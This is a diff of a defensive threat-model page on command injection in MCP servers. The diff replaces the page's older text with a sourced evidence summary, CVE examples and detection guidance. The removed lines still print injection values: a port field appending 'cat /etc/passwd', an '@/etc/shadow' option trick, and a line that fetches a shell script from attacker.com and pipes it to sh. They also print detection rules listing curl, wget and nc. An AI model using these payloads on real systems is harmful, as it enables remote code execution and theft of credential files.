@@ -1,745 +1,156 @@
 # SAF-T1101: Command Injection
 
+- **Tactic**: Execution (ATK-TA0002)
+- **Technique ID**: SAF-T1101
+- **Severity**: Critical
+- **Severity Rationale**: A successful boundary crossing can execute with the affected component's privileges and compromise confidentiality, integrity, and availability. <!-- SAF-TRACE: claims=SAF-T1101-C009; sources=SRC-cwe-78-v4.20 -->
+- **Evidence Status**: Observed
+- **Documentation Status**: Stable
+- **First Observed**: Public evidence in the reviewed corpus dates to the 2025 MCP Inspector and mcp-remote disclosures; CISA added the selected known-exploited LiteLLM vulnerability in 2026. <!-- SAF-TRACE: claims=SAF-T1101-C004,SAF-T1101-C007,SAF-T1101-C008; sources=SRC-cisa-kev-2026-09-01,SRC-jfrog-cve-2025-6514,SRC-oligo-inspector-cve-2025-49596 -->
+- **Last Updated**: 2026-09-01
+- **Research Packet**: [research/techniques/SAF-T1101/](../../research/techniques/SAF-T1101/)
+- **Traceability Ledger**: [traceability-ledger.yml](../../research/techniques/SAF-T1101/traceability-ledger.yml)
+
 ## Overview
 
-**Tactic**: Execution (ATK-TA0002), Initial Access (ATK-TA0001)
+Command Injection is the abuse of an MCP or agentic component's command-generation boundary so that attacker-influenced data changes executable syntax or selects an unintended operating-system command or program. <!-- SAF-TRACE: claims=SAF-T1101-C001,SAF-T1101-C011; sources=SRC-cwe-78-v4.20,SRC-mcp-security-2026-07-28 -->
 
-**Technique ID**: SAF-T1101
+The immediate objective is execution with the affected component's privileges; later privilege escalation, collection, exfiltration, or impact is separate behavior. <!-- SAF-TRACE: claims=SAF-T1101-C009; sources=SRC-cwe-78-v4.20 -->
 
-**Severity**: Critical (default) - adjust per server privilege, network reachability, and client trust model
+## Scope
 
-**First Observed**: December 2024 (Multiple MCP implementations)
+The defining security boundary lies between untrusted MCP-derived data or configuration and a shell, interpreter, or direct process-launch API used by a host, client, server, proxy, or tool. <!-- SAF-TRACE: claims=SAF-T1101-C011; sources=SRC-cwe-78-v4.20,SRC-mcp-security-2026-07-28 -->
 
-**Last Updated**: 2025-09-28
+In scope are both command modification through executable syntax and full command or program selection; both require a reachable launch boundary and attacker influence over command-bearing data. <!-- SAF-TRACE: claims=SAF-T1101-C001,SAF-T1101-C011; sources=SRC-cwe-78-v4.20 -->
+
+Prompt manipulation, browser access to localhost, malicious configuration persistence, and authorized command execution are out of scope unless the evidence also establishes this process-launch boundary crossing. <!-- SAF-TRACE: claims=SAF-T1101-C011; sources=SRC-cwe-78-v4.20,SRC-mcp-security-2026-07-28 -->
 
 ## Description
-Command Injection is a critical vulnerability where adversaries exploit unsanitized input in Model Context Protocol (MCP) server implementations to execute arbitrary system commands. This technique leverages the direct incorporation of user-supplied input into system commands executed by MCP servers without proper sanitization, enabling remote code execution under the server process's privileges.
 
-According to [Trend Micro research](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html), these vulnerabilities represent "a simple but dangerous flaw" that can undermine entire AI agent systems. The vulnerability is particularly severe because MCP servers often run with elevated privileges and have access to sensitive resources, making successful exploitation capable of leading to complete system compromise.
+MCP tool calls carry a tool name and arguments, and tools are model-controlled. The protocol requires servers to validate inputs and advises clients to show tool inputs, obtain confirmation, and log use. <!-- SAF-TRACE: claims=SAF-T1101-C002; sources=SRC-mcp-tools-2026-07-28 -->
+
+Those duties become security-critical when an implementation turns a URL, tool argument, server configuration, environment field, or proxy request into a local process. The reviewed cases show that failing to preserve the data-versus-code boundary can yield either shell-syntax injection or an unintended executable. <!-- SAF-TRACE: claims=SAF-T1101-C001,SAF-T1101-C010; sources=SRC-cwe-78-v4.20,SRC-jfrog-cve-2025-6514,SRC-ghsa-litellm-v4p8,SRC-ibm-2026-12940,SRC-oligo-inspector-cve-2025-49596 -->
 
 ## Attack Vectors
-- **Primary Vector**: Direct command injection through unsanitized parameters in MCP tool calls
-- **Secondary Vectors**:
-  - Prompt injection attacks that manipulate AI agents to call MCP tools with malicious payloads ([Microsoft, 2025](https://devblogs.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp))
-  - Supply chain compromise through forked vulnerable MCP server implementations
-  - Option injection through filenames or parameters starting with `-` (dash)
-  - SSRF → credential theft/RCE via internal services (e.g., cloud metadata endpoints). IMDSv1 (http://169.254.169.254) allows unauthenticated access; IMDSv2 requires session tokens but remains vulnerable post-RCE. IMDSv2 uses a session token (PUT) and defaults the token response to TTL=1, reducing SSRF via open WAF/proxies, but once RCE is achieved, these controls no longer protect role credentials. Egress controls and IMDSv2 with hop-limit=1 reduce but don't eliminate risk once code execution is achieved ([AWS Security Blog](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/))
-  - SQL injection in database-connected MCP servers ([Trend Micro, 2025](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html))
+
+- **Authorization metadata**: a remote MCP server supplies a command-bearing authorization URL that an unsafe client passes to a shell. <!-- SAF-TRACE: claims=SAF-T1101-C003,SAF-T1101-C010; sources=SRC-mcp-security-2026-07-28,SRC-jfrog-cve-2025-6514 -->
+- **Tool or proxy input**: a caller reaches an MCP endpoint that accepts a command, argument list, or complete executable selection. <!-- SAF-TRACE: claims=SAF-T1101-C005,SAF-T1101-C008,SAF-T1101-C010; sources=SRC-ghsa-litellm-v4p8,SRC-oligo-inspector-cve-2025-49596 -->
+- **Server configuration**: an attacker influences local MCP startup command, argument, or environment data that crosses into a process launch. <!-- SAF-TRACE: claims=SAF-T1101-C006,SAF-T1101-C010; sources=SRC-ibm-2026-12940 -->
 
 ## Technical Details
 
-### Prerequisites
-- Access to an MCP client that can invoke server tools
-- Target MCP server with command execution functionality
-- Knowledge of the target server's tool schemas and parameters
-- Understanding of shell metacharacters and command chaining syntax
+1. The adversary influences a URL, tool field, proxy request, startup command, argument, or environment value. <!-- SAF-TRACE: claims=SAF-T1101-C010,SAF-T1101-C011; sources=SRC-jfrog-cve-2025-6514,SRC-ghsa-litellm-v4p8,SRC-ibm-2026-12940,SRC-oligo-inspector-cve-2025-49596 -->
+2. An MCP-related component accepts the value at a reachable launch path without sufficiently constraining shell syntax, executable choice, or startup state. <!-- SAF-TRACE: claims=SAF-T1101-C001,SAF-T1101-C011; sources=SRC-cwe-78-v4.20,SRC-mcp-security-2026-07-28 -->
+3. The operating system starts an altered command, command interpreter, or unintended program with the component's privileges. <!-- SAF-TRACE: claims=SAF-T1101-C009; sources=SRC-cwe-78-v4.20 -->
 
-### Common Injection Points & Vulnerable Functions
+This model does not treat MCP or stdio as inherently unsafe: the weakness is the implementation boundary that converts attacker-influenced data into process behavior. <!-- SAF-TRACE: claims=SAF-T1101-C003,SAF-T1101-C011; sources=SRC-mcp-security-2026-07-28,SRC-cwe-78-v4.20 -->
 
-#### Language-Specific Vulnerable APIs
+## Evidence and Current State
 
-**Python** (Vulnerable → Safe):
-```python
-# VULNERABLE: Shell interpretation enabled
-os.system(f"convert {filename} output.pdf")
-subprocess.call(f"convert {filename} output.pdf", shell=True)
-subprocess.run(f"convert {filename} output.pdf", shell=True)
+### Evidence Summary
 
-# SAF: No shell interpretation (Linux)
-subprocess.run(["/usr/bin/magick", filename, "output.pdf"], shell=False)
-# Windows: Use absolute path to avoid convert.exe (filesystem tool)
-# subprocess.run([r"C:\Program Files\ImageMagick-7.1.1-Q16\magick.exe", filename, "output.pdf"], shell=False)
+| Claim | Evidence status | Sources | Limitation |
+|---|---|---|---|
+| SAF-T1101-C001 | Research-derived | SRC-cwe-78-v4.20 | A weakness definition does not prove an MCP implementation is vulnerable. |
+| SAF-T1101-C002 | Research-derived | SRC-mcp-tools-2026-07-28 | Protocol requirements do not prove universal compliance. |
+| SAF-T1101-C003 | Research-derived | SRC-mcp-security-2026-07-28 | The guidance describes an unsafe implementation class. |
+| SAF-T1101-C004 | Observed | SRC-cisa-kev-2026-09-01; SRC-ghsa-litellm-v4p8 | No victim, campaign, or exploit telemetry is public in the reviewed record. |
+| SAF-T1101-C005 | Observed vulnerability | SRC-ghsa-litellm-v4p8; SRC-nvd-2026-42271 | The project advisory publishes no in-the-wild exploitation detail. |
+| SAF-T1101-C006 | Observed vulnerability | SRC-ibm-2026-12940; SRC-nvd-2026-12940 | Production exploitation was not established. |
+| SAF-T1101-C007 | Demonstrated | SRC-jfrog-cve-2025-6514; SRC-jfsa-2025-6514; SRC-nvd-2025-6514 | A demonstration is not a production incident. |
+| SAF-T1101-C008 | Demonstrated | SRC-oligo-inspector-cve-2025-49596; SRC-ghsa-inspector-7f8r; SRC-nvd-2025-49596 | Missing authorization is the primary weakness; command selection is the matched variant. |
+| SAF-T1101-C009 | Research-derived | SRC-cwe-78-v4.20 | Impact depends on process privileges and surrounding controls. |
+| SAF-T1101-C010 | Observed | SRC-jfrog-cve-2025-6514; SRC-ghsa-litellm-v4p8; SRC-ibm-2026-12940; SRC-oligo-inspector-cve-2025-49596 | The vector list is representative. |
+| SAF-T1101-C011 | Research-derived inference | SRC-cwe-78-v4.20; SRC-mcp-security-2026-07-28 | The boundary model is a synthesis. |
+| SAF-T1101-C012 | Research-derived | SRC-sysmon-15-21 | Sysmon is Windows-specific and must be configured. |
+| SAF-T1101-C013 | Research-derived | SRC-ecs-process-current | Schema support does not ensure field population. |
+| SAF-T1101-C014 | Research-derived inference | SRC-sysmon-15-21; SRC-ecs-process-current; SRC-mitre-t1059-current | Validation uses synthetic fixtures only. |
+| SAF-T1101-C015 | Research-derived | SRC-cwe-78-v4.20; SRC-mitre-t1059-current | No production error rate is claimed. |
+| SAF-T1101-C016 | Research-derived | SRC-owasp-command-injection; SRC-python-subprocess-3.14; SRC-node-child-process-v26 | Escaping alone is platform-dependent. |
+| SAF-T1101-C017 | Research-derived | SRC-mcp-tools-2026-07-28; SRC-mcp-security-2026-07-28 | Defense in depth does not repair unsafe construction. |
+| SAF-T1101-C018 | Research-derived inference | SRC-mitre-t1059-current; SRC-cwe-78-v4.20 | ATT&CK T1059 is analogous, not identical. |
 
-# Windows-specific note:
-# Avoid invoking .bat/.cmd directly; Windows argument parsing may still involve
-# a shell. Prefer native executables or fully controlled wrappers.
-# Always use absolute binary paths to avoid PATH hijacking.
-```
+### Selected Current Examples
 
-**Node.js** (Vulnerable → Safe):
-```javascript
-// VULNERABLE: Shell interpretation via exec
-const { exec } = require('child_process');
-exec(`convert ${filename} output.pdf`);
+| Example | Relationship | Why selected | Remediation state |
+|---|---|---|---|
+| CVE-2026-42271 / LiteLLM | Direct vulnerability; CISA known exploited | Strongest exploitation evidence and direct low-privilege MCP stdio process launch; no named victim is inferred. | Fixed in 1.83.7 with administrator-only access; downstream vendor fixes also exist. | <!-- SAF-TRACE: claims=SAF-T1101-C004,SAF-T1101-C005; sources=SRC-cisa-kev-2026-09-01,SRC-ghsa-litellm-v4p8,SRC-nvd-2026-42271 -->
+| CVE-2026-12940 / Langflow | Direct vulnerability | Current first-party, critical, unauthenticated environment-injection path into an MCP stdio launcher. | Fixed in 1.10.2; IBM lists no workaround. | <!-- SAF-TRACE: claims=SAF-T1101-C006; sources=SRC-ibm-2026-12940,SRC-nvd-2026-12940 -->
+| CVE-2025-6514 / mcp-remote | Direct vulnerability and demonstration | End-to-end authorization-URL command-injection evidence with distinct shell and executable-launch behavior. | Fixed in 0.1.16. | <!-- SAF-TRACE: claims=SAF-T1101-C007; sources=SRC-jfrog-cve-2025-6514,SRC-jfsa-2025-6514,SRC-nvd-2025-6514 -->
+| CVE-2025-49596 / MCP Inspector | Direct full-command-selection vulnerability and demonstration | Captures the local-proxy and arbitrary executable-selection variant while preserving the missing-authorization limitation. | Fixed in 0.14.1 with session-token and origin protections. | <!-- SAF-TRACE: claims=SAF-T1101-C008; sources=SRC-oligo-inspector-cve-2025-49596,SRC-ghsa-inspector-7f8r,SRC-nvd-2025-49596 -->
 
-// SAF: Direct command execution without shell (Linux)
-const { execFile } = require('child_process');
-execFile('/usr/bin/magick', [filename, 'output.pdf']);
-// Windows: execFile('C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe', [filename, 'output.pdf']);
-```
-
-**Go** (Vulnerable → Safe):
-```go
-// VULNERABLE: Shell interpretation
-exec.Command("/bin/sh", "-c", fmt.Sprintf("convert %s output.pdf", filename))
-
-// SAF: Direct command execution (Linux)
-exec.Command("/usr/bin/magick", filename, "output.pdf")
-// Windows: exec.Command("C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe", filename, "output.pdf")
-```
-
-**Ruby** (Vulnerable → Safe):
-```ruby
-# VULNERABLE: Shell interpretation
-system("convert #{filename} output.pdf")
-`convert #{filename} output.pdf`
-
-# SAF: Array form prevents shell interpretation (Linux)
-system("/usr/bin/magick", filename, "output.pdf")
-# Windows: system("C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe", filename, "output.pdf")
-```
-
-**PHP** (Vulnerable → Safe):
-```php
-// VULNERABLE: Direct shell execution
-exec("convert $filename output.pdf");
-shell_exec("convert $filename output.pdf");
-
-// Safer (but still not recommended): escaping when you cannot avoid the shell
-$safe_filename = escapeshellarg($filename);
-exec("/usr/bin/magick $safe_filename output.pdf");
-// Preferred: avoid shell entirely (e.g., Imagick PHP extension) or use a no-shell
-// process API that passes argv as an array (with strict allowlists).
-```
-
-**Java** (Vulnerable → Safe):
-```java
-// VULNERABLE: Shell interpretation on Windows/Unix
-ProcessBuilder pb = new ProcessBuilder("sh", "-c", "convert " + filename + " output.pdf");
-
-// SAF: Direct command array (Linux)
-ProcessBuilder pb = new ProcessBuilder("/usr/bin/magick", filename, "output.pdf");
-// Windows: new ProcessBuilder("C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe", filename, "output.pdf");
-```
-
-### Attack Flow
-1. **Initial Stage**: Attacker identifies MCP server with command execution tools through enumeration or documentation review
-2. **Vulnerability Discovery**: Attacker tests input parameters for command injection vulnerabilities using shell metacharacters
-3. **Payload Crafting**: Malicious input is crafted using:
-   - Command separators (`;`, `|`, `&&`, `||` on Unix; `&`, `|`, `&&`, `||` on Windows)
-   - Substitution/Expansion: POSIX command substitution (`$()` or legacy backticks); cmd.exe variable expansion (`%VAR%`); PowerShell sub-expression (`$()`)
-   - Option injection (filenames starting with `-`)
-4. **Exploitation Stage**: Payload is submitted through MCP tool invocation, either directly or via prompt injection
-5. **Command Execution**: Server concatenates unsanitized input into system command, executing attacker's injected commands
-6. **Post-Exploitation**: Attacker gains unauthorized access, exfiltrates data, or establishes persistence
-
-### Exploitation Techniques
-
-#### Basic Command Injection
-```json
-{
-  "port": "8080; cat /etc/passwd"
-}
-```
-
-#### Option/Response-File Injection
-```json
-{
-  "filename": "-o/etc/passwd"   // Treated as output flag by many tools
-}
-{
-  "filename": "--help"          // Triggers help instead of processing
-}
-{
-  "filename": "@/etc/shadow"     // Some tools treat @ as response-file inclusion
-}
-```
-Note: Many tools support response files (e.g., '@list.txt'), which can be abused if
-user-controlled names start with '@'. The '--' end-of-options marker is widely used
-per POSIX guidelines but not universal; verify per binary and add explicit allowlists.
-
-#### OS-Specific Metacharacters
-```bash
-# Unix/Linux
-; | && || ` $() \n
-
-# Windows cmd.exe
-& | && || ^ %var%
-
-# PowerShell
-; | && || $() `
-```
-
-#### Advanced Techniques
-According to [NodeJS Security](https://www.nodejs-security.com/blog/command-injection-vulnerability-codehooks-mcp-server-security-analysis), the Codehooks MCP Server vulnerability demonstrates a typical pattern:
-
-```javascript
-// Vulnerable implementation
-const command = `lsof -i :${port}`;
-exec(command, (error, stdout, stderr) => {
-  // Process output
-});
-
-// Attack: port = "8080; curl http://attacker.com/shell.sh | sh"
-```
-
-### Secure Code Examples
-
-#### Python - Production-Grade Input Validation
-```python
-import os
-import re
-import subprocess
-from pathlib import Path
-
-BASE = Path("/app/uploads").resolve()
-
-def sanitize_filename(name: str) -> str:
-    """Only allow simple basenames: no slashes, no leading dot, no leading dash"""
-    if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,127}", name):
-        raise ValueError("Invalid filename")
-    return name
-
-def materialize_under_base(name: str) -> Path:
-    """Ensure path stays within BASE directory"""
-    p = (BASE / sanitize_filename(name)).resolve()
-    if not str(p).startswith(str(BASE) + os.sep):
-        raise ValueError("Path escape attempt")
-    return p
-
-def convert_to_pdf(user_name: str, out_name: str = "output.pdf") -> None:
-    """Securely convert file to PDF"""
-    src = materialize_under_base(user_name)
-    out = (BASE / sanitize_filename(out_name)).resolve()
-
-    # Linux: defend against symlink swaps with O_NOFOLLOW
-    fd = os.open(str(src), os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
-    try:
-        src_fd_path = f"/proc/self/fd/{fd}"  # Linux-specific
-        env = {"PATH": "/usr/bin:/bin"}      # Minimal, fixed PATH
-        # Note: convert.exe on Windows is a filesystem tool, not ImageMagick
-        subprocess.run(
-            ["/usr/bin/magick", src_fd_path, str(out)],
-            check=True,
-            shell=False,  # Critical: Never use shell=True
-            env=env,
-            close_fds=True,
-            timeout=30,  # Prevent DoS
-        )
-    finally:
-        os.close(fd)
-```
-
-#### Node.js - Safe Subprocess Execution
-```javascript
-const { execFile } = require('node:child_process');
-const path = require('node:path');
-
-const BASE = '/app/uploads';
-
-function sanitizeFilename(name) {
-    if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/.test(name)) {
-        throw new Error('Invalid filename');
-    }
-    return name;
-}
-
-function convertToPdf(userFilename, callback) {
-    const safeName = sanitizeFilename(userFilename);
-    const fullPath = path.resolve(BASE, safeName);
-
-    // Ensure path doesn't escape BASE
-    if (!fullPath.startsWith(BASE + path.sep)) {
-        throw new Error('Path traversal attempt');
-    }
-
-    // Note: convert.exe on Windows is a filesystem tool, not ImageMagick
-    execFile('/usr/bin/magick', [fullPath, 'output.pdf'], {
-        env: { PATH: '/usr/bin:/bin' },
-        cwd: '/app/sandbox',  // Set working directory to sandbox
-        windowsHide: true,
-        timeout: 30000
-    }, (error) => {
-        if (error && error.code === 'ENOENT') {
-            throw new Error('ImageMagick not found at expected path');
-        }
-        callback(error);
-    });
-}
-```
-
-#### Go - Command Execution Without Shell
-```go
-package main
-
-import (
-    "context"
-    "fmt"
-    "os/exec"
-    "path/filepath"
-    "regexp"
-    "strings"
-    "syscall"
-    "time"
-)
-
-const BASE = "/app/uploads"
-
-var filenameRegex = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$`)
-
-func sanitizeFilename(name string) (string, error) {
-    if !filenameRegex.MatchString(name) {
-        return "", fmt.Errorf("invalid filename")
-    }
-    return name, nil
-}
-
-func convertToPDF(userFilename string) error {
-    safeName, err := sanitizeFilename(userFilename)
-    if err != nil {
-        return err
-    }
-
-    fullPath := filepath.Join(BASE, safeName)
-    absPath, _ := filepath.Abs(fullPath)
-
-    // Ensure path doesn't escape BASE
-    if !strings.HasPrefix(absPath, BASE+string(filepath.Separator)) {
-        return fmt.Errorf("path traversal attempt")
-    }
-
-    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-    defer cancel()
-
-    // Note: convert.exe on Windows is a filesystem tool, not ImageMagick
-    cmd := exec.CommandContext(ctx, "/usr/bin/magick", absPath, "output.pdf")
-    cmd.Env = []string{"PATH=/usr/bin:/bin"}
-    cmd.SysProcAttr = &syscall.SysProcAttr{
-        Noctty: true,  // Prevent TTY allocation
-    }
-    cmd.Dir = "/app/sandbox"  // Set working directory
-
-    return cmd.Run()
-}
-```
+The evidence status is conservatively **Observed** because KEV establishes exploitation of one direct instance; it is not labeled as a named breach, and demonstrations remain separately classified. <!-- SAF-TRACE: claims=SAF-T1101-C004,SAF-T1101-C007,SAF-T1101-C008; sources=SRC-cisa-kev-2026-09-01,SRC-jfrog-cve-2025-6514,SRC-oligo-inspector-cve-2025-49596 -->
 
 ## Impact Assessment
-- **Confidentiality**: High - Full access to server-accessible files, credentials, and data
-- **Integrity**: High - Arbitrary file modification, code injection, and system configuration changes
-- **Availability**: High - Service disruption, resource exhaustion, or complete system destruction
-- **Scope**: Network-wide - Potential for lateral movement and supply chain impact
 
-### Current Status (2025)
-According to [Trend Micro](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html), Anthropic's vulnerable SQLite MCP server was forked over 5,000 times before being archived, creating an extensive supply-chain blast radius where unpatched code exists in thousands of downstream agents, many likely in production environments.
+Execution occurs with the affected component's privileges. Consequences can include unauthorized access to data, alteration of local state, service disruption, and a platform for later adversary actions. <!-- SAF-TRACE: claims=SAF-T1101-C009; sources=SRC-cwe-78-v4.20 -->
+
+Severity depends on reachability, authentication, component privilege, sandbox boundaries, and whether the launch occurs on a developer workstation, server, or shared gateway. <!-- SAF-TRACE: claims=SAF-T1101-C009,SAF-T1101-C011; sources=SRC-cwe-78-v4.20,SRC-mcp-security-2026-07-28 -->
 
 ## Detection Methods
 
-### Runtime Detection (Production-Grade)
+Use the repository's [correlation rule](detection-rule.yml) with [synthetic fixtures](test-logs.json), the [standalone harness](test_detection_rule.py), and the recorded [test results](test-results.json).
 
-#### Falco Rules (Container Runtime Monitoring)
-```yaml
-# Note: Uses Falco's built-in macros (shell_procs, spawned_process) for better accuracy
-# See: https://falco.org/docs/rules/default-macros/
-- rule: MCP Spawns Shell
-  desc: MCP server spawned a shell inside a container
-  condition: >
-    container and spawned_process and
-    shell_procs and
-    proc.pname endswith "mcp-server"
-  output: >
-    MCP spawned shell (user=%user.name parent=%proc.pname
-    cmd=%proc.cmdline container=%container.name)
-  priority: WARNING
-  tags: [attack.T1059, attack.T1059.004]
+The analytic joins an untrusted MCP command-bearing event to a child process within ten seconds, requires matching correlation and parent identities, and alerts on either shell-control syntax or an unexpected executable change. <!-- SAF-TRACE: claims=SAF-T1101-C011,SAF-T1101-C014; sources=SRC-cwe-78-v4.20,SRC-sysmon-15-21,SRC-ecs-process-current -->
 
-- rule: MCP Executes Suspicious Binary
-  desc: MCP server executed potentially malicious binary
-  condition: >
-    container and spawned_process and
-    proc.pname endswith "mcp-server" and
-    proc.name in (curl, wget, nc, ncat, python, perl, ruby)
-  output: >
-    Suspicious execution from MCP (exe=%proc.name cmdline=%proc.cmdline)
-  priority: WARNING
-```
+Collect MCP action, trust, source, approval, policy, component, and correlation fields together with process timestamp, entity, parent, executable, arguments, and command line. Sysmon Event ID 1 supplies key Windows values, while ECS defines portable normalized fields. <!-- SAF-TRACE: claims=SAF-T1101-C012,SAF-T1101-C013; sources=SRC-sysmon-15-21,SRC-ecs-process-current -->
 
-#### auditd Rules (Linux Kernel Audit)
-```bash
-# Monitor all execve calls from MCP server (both 64/32-bit where applicable)
-# Note: Aggressive audit rules can impact performance; adjust buffer size and rate limits
-# See: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files
--a always,exit -F arch=b64 -S execve -F exe=/usr/bin/mcp-server -k mcp_exec
--a always,exit -F arch=b32 -S execve -F exe=/usr/bin/mcp-server -k mcp_exec
-# Alternative using comm field (process name):
-# -a always,exit -F arch=b64 -S execve -F comm=mcp-server -k mcp_exec
-
-# Monitor shell binaries for execution (watch rules don't support -F ppid)
-# To filter by parent, use execve syscall rules instead:
--w /bin/bash -p x -k mcp_shell
--w /bin/sh -p x -k mcp_shell
-# Parent-specific filtering is best done in your SIEM (ppid field). Keep rules static, e.g.:
-# -a always,exit -F arch=b64 -S execve -F exe=/bin/bash -k mcp_shell_spawn
-```
-
-#### Sigma Rule (Portable SIEM Detection)
-```yaml
-title: Linux - MCP Service Spawns Shell
-id: a4b3c2d1-8e7f-4a5b-9c6d-3e2f1a0b9c8d
-status: experimental
-description: Detects MCP server spawning shell or suspicious binaries
-logsource:
-  product: linux
-  category: process_creation
-detection:
-  selection_parent:
-    ParentImage|endswith:
-      - '/mcp-server'
-      - '/mcp-server.js'
-      - '/mcp_server.py'
-  selection_child_shell:
-    Image|endswith:
-      - '/bin/sh'
-      - '/bin/bash'
-      - '/bin/dash'
-      - '/bin/zsh'
-  selection_child_suspicious:
-    Image|endswith:
-      - '/usr/bin/curl'
-      - '/usr/bin/wget'
-      - '/usr/bin/python'
-      - '/usr/bin/nc'
-  condition: selection_parent and (selection_child_shell or selection_child_suspicious)
-falsepositives:
-  - Legitimate MCP servers that require shell execution
-level: high
-tags:
-  - attack.execution
-  - attack.t1059
-  - attack.t1059.004  # Unix Shell
-  - attack.t1190      # Exploit Public-Facing Application
-```
-
-#### Windows Detection (Sysmon/Security Logs)
-```yaml
-title: Windows - MCP Server Spawns Shell
-id: b5c4d3e2-9f8e-5b6a-0d7c-4f3g2b1a0d9f
-status: experimental
-description: Detects MCP server spawning cmd.exe or PowerShell on Windows
-logsource:
-  product: windows
-  service: sysmon
-detection:
-  selection_sysmon:
-    EventID: 1  # Process creation
-    ParentImage|endswith:
-      - '\mcp-server.exe'
-      - '\node.exe'  # If MCP runs via Node.js
-    Image|endswith:
-      - '\cmd.exe'
-      - '\powershell.exe'
-      - '\pwsh.exe'
-      - '\cscript.exe'
-      - '\wscript.exe'
-  selection_security:
-    EventID: 4688  # Process creation (Security log)
-    ParentProcessName|endswith: '\mcp-server.exe'
-    NewProcessName|endswith:
-      - '\cmd.exe'
-      - '\powershell.exe'
-  condition: selection_sysmon or selection_security
-level: high
-tags:
-  - attack.execution
-  - attack.t1059.003  # Windows Command Shell
-```
-
-### Application-Level Detection
-
-```yaml
-# Enhanced Sigma rule for MCP logs
-title: MCP Tool Parameter Command Injection Attempt
-logsource:
-  product: mcp
-  service: server
-detection:
-  selection_metacharacters:
-    tool_parameters|contains:
-      - ';'
-      - '&&'
-      - '||'
-      - '$('
-      - '`'
-  selection_option_injection:
-    tool_parameters|re: '^-[a-zA-Z]'  # Parameters starting with dash (tune per context to reduce FPs)
-  condition: selection_metacharacters or selection_option_injection
-```
+Expect ambiguity from authorized automation and diagnostics, missing approval context, indirect launch chains, encoding, and telemetry gaps. The ten-case fixture result validates logic boundaries but not production precision or recall. <!-- SAF-TRACE: claims=SAF-T1101-C015; sources=SRC-cwe-78-v4.20,SRC-mitre-t1059-current -->
 
 ## Mitigation Strategies
 
-### Preventive Controls
-
-#### Input Validation Architecture
-1. **Never Trust User Input**: Treat all external input as potentially malicious
-2. **Use Allowlists, Not Denylists**: Define what's allowed rather than blocking known bad patterns
-3. **Validate at Multiple Layers**: Input validation at API gateway, application, and subprocess layers
-4. **Enforce Type Safety**: Use strongly-typed parameters where possible
-
-#### Input Normalization & Unicode Security
-**Normalize & Reject Before Validate**:
-- Normalize Unicode to NFC; strip zero-width characters and control chars (`\r`, `\n`, `\t`, `\0`)
-- Reject leading `-`, `@`, or a lone `-` (stdin marker). Forbid response-file semantics unless explicitly required
-- Treat `--` as end-of-options only if the target binary documents it; otherwise fail-closed
-- Watch for Unicode confusables: em-dash (—), en-dash (–), look-alike @ (＠), and other homoglyphs
-
-```python
-import unicodedata
-import re
-
-def normalize_and_validate(input_str: str) -> str:
-    """Normalize Unicode and reject dangerous patterns"""
-    # Normalize to NFC
-    normalized = unicodedata.normalize('NFC', input_str)
-
-    # Strip zero-width characters
-    normalized = re.sub(r'[\u200b-\u200f\u202a-\u202e\ufeff]', '', normalized)
-
-    # Reject control characters
-    if re.search(r'[\x00-\x1f\x7f]', normalized):
-        raise ValueError("Control characters not allowed")
-
-    # Reject leading dash, @, or standalone dash
-    if normalized.startswith(('-', '@')) or normalized == '-':
-        raise ValueError("Dangerous prefix or stdin marker detected")
-
-    # Reject Unicode confusables (example set)
-    confusables = '—–＠'  # em-dash, en-dash, fullwidth @
-    if any(char in normalized for char in confusables):
-        raise ValueError("Unicode confusables detected")
-
-    return normalized
-```
-
-#### MCP-Aware Schema Hardening
-Define strict tool parameter schemas with:
-```jsonc
-{
-  "type": "object",
-  "properties": {
-    "filename": {
-      "type": "string",
-      "pattern": "^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$",
-      "not": {
-        "pattern": "^[-@]"  // Forbid leading dash and @ (option/response-file injection)
-      }
-    },
-    "port": {
-      "type": "integer",
-      "minimum": 1,
-      "maximum": 65535
-    },
-    "callback_url": {
-      "type": "string",
-      "format": "uri",
-      "pattern": "^https://(api\\.example\\.com|webhook\\.trusted\\.org)/"
-    }
-  }
-}
-```
-Enforce server-side validation even if clients validate.
-
-#### Language-Specific Safe Practices
-
-| Language | Unsafe Functions | Safe Alternatives | Documentation |
-|----------|-----------------|-------------------|---------------|
-| Python | `os.system()`, `subprocess.*` with `shell=True` | `subprocess.run([...], shell=False)` | [subprocess security](https://docs.python.org/3/library/subprocess.html#security-considerations) |
-| Node.js | `child_process.exec()` | `child_process.execFile()`, `child_process.spawn()` | [child_process security](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) |
-| Go | `exec.Command("/bin/sh", "-c", ...)` | `exec.Command(binary, args...)` | [os/exec package](https://pkg.go.dev/os/exec) |
-| Ruby | `system(string)`, backticks | `system(cmd, arg1, arg2)` | [Kernel#system](https://ruby-doc.org/core/Kernel.html#method-i-system) |
-| PHP | `exec()`, `shell_exec()`, `passthru()` | Avoid shelling out; use libraries | [Program execution](https://www.php.net/manual/en/ref.exec.php) |
-| Java | `Runtime.exec(string)` | `ProcessBuilder` with array | [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) |
-
-#### Container Deployment Hardening
-
-If deploying MCP servers in containers, apply Kubernetes Pod Security Standards 'restricted' profile and network policies to limit post-exploitation impact. See [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) for implementation details.
-
-#### Server Policy Guardrails
-**Enforce these policies at the MCP server level**:
